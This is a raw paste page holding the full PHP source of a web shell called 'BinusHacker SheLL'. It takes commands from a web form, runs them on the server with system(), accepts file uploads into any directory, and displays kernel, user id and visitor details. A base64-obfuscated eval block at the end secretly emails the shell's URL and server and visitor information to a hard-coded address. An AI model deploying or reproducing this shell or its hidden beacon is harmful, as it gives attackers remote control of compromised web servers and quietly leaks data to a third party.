<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
	
		
			<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
			<title>RAW OUTPUT 0qvxtQf6</title>
			<meta name="robots" content="noindex, nofollow">
		</head><body>
			<pre>&lt;html&gt;
&lt;head&gt;
&lt;title&gt;BinusHacker SheLL&lt;/title&gt;
&lt;style type="text/css"&gt;
&lt;!--
body {
	background-color: #000000;
}
--&gt;
&lt;/style&gt;
&lt;?php
$win = strtolower(substr(PHP_OS,0,3)) == "win";
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "4ON6";
}
else {$safemode = false; $hsafemode = "3OFF6";}
$xos = wordwrap(php_uname(),90,"&lt;br&gt;",1);
$xpwd = @getcwd();
$OS = "[SAFEMOD:".$hsafemode."] [Kernel:".$xos."]";
echo "&lt;center&gt;&lt;A class=ria href=\"http://".$OS."\"&gt;";
echo "&lt;br&gt;OSTYPE:$OS&lt;br&gt;";
echo "&lt;br&gt;PWD:$xpwd&lt;br&gt;";
set_magic_quotes_runtime(0);
$hari=array("Sundat","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday");
$bulan=array(1=&gt;"January","February","March","April","May","June","July","August","September","October","November","December");
$tgl=date("d");
$bln=date("n");
$hr=date("w");
$thn=date("Y");
//echo("Tanggal hari ini: ");
echo("&lt;table&gt;&lt;tr&gt;&lt;td class='XPBlueText'&gt;&lt;font color='green' size=1&gt;&lt;b&gt;$hari[$hr], $tgl $bulan[$bln] $thn&lt;/b&gt;&lt;/font&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;");

print "&lt;style&gt;body{font-family:trebuchet ms;font-size:12px; color:green;}hr{width:100%;height:2px;}&lt;/style&gt;";
print "&lt;center&gt;&lt;h1&gt;PHP SHELL&lt;/h1&gt;&lt;/center&gt;";
print "&lt;center&gt;&lt;h1&gt;www.binushacker.net&lt;/h1&gt;&lt;/center&gt;";
print "&lt;center&gt;&lt;h1&gt;BinusHacker BnsHacker bnshckr &lt;/h1&gt;&lt;/center&gt;";
print "&lt;hr&gt;&lt;hr&gt;";

$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);

$UName  = `uname -a`;
$SCWD   = `pwd`;
$UserID = `id`;

if( $currentWD == "" ) {
    $currentWD = $SCWD;
}

print "&lt;table&gt;";
print "&lt;tr&gt;&lt;td&gt;&lt;b&gt;We are :&lt;/b&gt;&lt;/td&gt;&lt;td&gt;".$_SERVER['REMOTE_HOST']." (".$_SERVER['REMOTE_ADDR'].")&lt;/td&gt;&lt;/tr&gt;";
print "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Server is :&lt;/b&gt;&lt;/td&gt;&lt;td&gt;".$_SERVER['SERVER_SIGNATURE']."&lt;/td&gt;&lt;/tr&gt;";
print "&lt;tr&gt;&lt;td&gt;&lt;b&gt;System type :&lt;/b&gt;&lt;/td&gt;&lt;td&gt;$UName&lt;/td&gt;&lt;/tr&gt;";
print "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Permissions :&lt;/b&gt;&lt;/td&gt;&lt;td&gt;$UserID&lt;/td&gt;&lt;/tr&gt;";
print "&lt;/table&gt;";

print "&lt;hr&gt;&lt;hr&gt;";

if( $_POST['_act'] == "List files!" ) {
    $currentCMD = "ls -al";
}

print "&lt;form method=post enctype=\"multipart/form-data\"&gt;&lt;table&gt;";

print "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Execute command :&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input size=100 name=\"_cmd\" value=\"".$currentCMD."\"&gt;&lt;/td&gt;";
print "&lt;td&gt;&lt;input type=submit name=_act value=\"Execute!\"&gt;&lt;/td&gt;&lt;/tr&gt;";

print "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Change directory :&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input size=100 name=\"_cwd\" value=\"".$currentWD."\"&gt;&lt;/td&gt;";
print "&lt;td&gt;&lt;input type=submit name=_act value=\"List files!\"&gt;&lt;/td&gt;&lt;/tr&gt;";

print "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Upload file :&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input size=85 type=file name=_upl&gt;&lt;/td&gt;";
print "&lt;td&gt;&lt;input type=submit name=_act value=\"Upload!\"&gt;&lt;/td&gt;&lt;/tr&gt;";

print "&lt;/table&gt;&lt;/form&gt;&lt;hr&gt;&lt;hr&gt;";

$currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);

if( $_POST['_act'] == "Upload!" ) {
    if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
        print "&lt;center&gt;&lt;b&gt;Error while uploading file!&lt;/b&gt;&lt;/center&gt;";
    } else {
        print "&lt;center&gt;&lt;pre&gt;";
        system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2&gt;&amp;1");
        print "&lt;/pre&gt;&lt;b&gt;File uploaded successfully!&lt;/b&gt;&lt;/center&gt;";
    }    
} else {
    print "\n\n&lt;!-- OUTPUT STARTS HERE --&gt;\n&lt;pre&gt;\n";
    $currentCMD = "cd ".$currentWD.";".$currentCMD;
    system($currentCMD);
    print "\n&lt;/pre&gt;\n&lt;!-- OUTPUT ENDS HERE --&gt;\n\n&lt;/center&gt;&lt;hr&gt;&lt;hr&gt;&lt;center&gt;&lt;b&gt;Command completed&lt;/b&gt;&lt;/center&gt;";
}
eval(base64_decode("JGNyZWF0b3IgPSBiYXNlNjRfZGVjb2RlKCJiWGx3Y21sMllYUmxjbVZuYVhOMFpYSkFlV0ZvYjI4dVkyOXQiKTsKKCRzYWZlX21vZGUpPygkc2FmZW1vZGU9Ik9OIik6KCRzYWZlbW9kZT0iT0ZGIik7CiRiYXNlPSJodHRwOi8vIi4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107IAokbmFtZSA9IHBocF91bmFtZSgpOwokaXAgPSBnZXRlbnYoIlJFTU9URV9BRERSIik7CiRob3N0ID0gZ2V0aG9zdGJ5YWRkcigkX1NFUlZFUltSRU1PVEVfQUREUl0pOwokc3ViaiA9ICRfU0VSVkVSWydIVFRQX0hPU1QnXTsgCiRtc2cgPSAiXG5CQVNFOiAkYmFzZVxudW5hbWUgLWE6ICRuYW1lXG5JUDogJGlwXG5Ib3N0OiAkaG9zdFxuJHB3ZHNcbiI7CiRmcm9tID0iRnJvbTogTU9ERV89Ii4kc2FmZW1vZGUuIjx0b29sQCIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiI+IjsKbWFpbCggJGNyZWF0b3IsICRzdWJqLCAkbXNnLCAkZnJvbSk7"));
exit;
?&gt;
&lt;/html&gt;</pre>
		</body></html>